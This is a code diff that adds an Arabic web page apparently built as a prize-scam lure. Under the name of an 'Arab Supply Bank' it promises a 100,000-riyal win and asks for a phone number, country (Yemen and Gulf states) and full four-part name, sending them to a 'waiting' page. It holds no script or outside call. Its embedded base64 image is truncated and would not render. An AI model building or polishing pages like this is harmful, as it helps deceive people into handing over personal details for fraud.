@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أربح مع بنك التموين العربي</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <!-- غلاف الصفحة -->
+        <header>
+            <!-- الصورة مشفرة باستخدام base64 -->
+            <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAAAAAAAD/2wBDAAoHBwkICwkLCwkLDAwNDg4NDh8OGx4kGBAeGx4hGx8aKX9GVrld7" alt="أموال" class="cover-image">
+            <h1>أربح مع بنك التموين العربي</h1>
+            <h2>الأصفر 100 ألف ريال</h2>
+        </header>
+        
+        <!-- نموذج الإدخال -->
+        <div class="form-container">
+            <form action="waiting.html" method="get">
+                <label for="phone-number">أدخل رقمك:</label>
+                <input type="tel" id="phone-number" name="phone-number" required placeholder="رقم الهاتف">
+                <select id="country" name="country" required>
+                    <option value="ye">اليمن</option>
+                    <option value="sa">السعودية</option>
+                    <option value="om">عمان</option>
+                    <option value="ae">الإمارات</option>
+                    <option value="kw">الكويت</option>
+                    <option value="bh">البحرين</option>
+                    <option value="qa">قطر</option>
+                </select>
+
+                <label for="full-name">أدخل اسمك الرباعي:</label>
+                <input type="text" id="full-name" name="full-name" required placeholder="الاسم الرباعي">
+
+                <button type="submit" class="submit-btn">تم</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
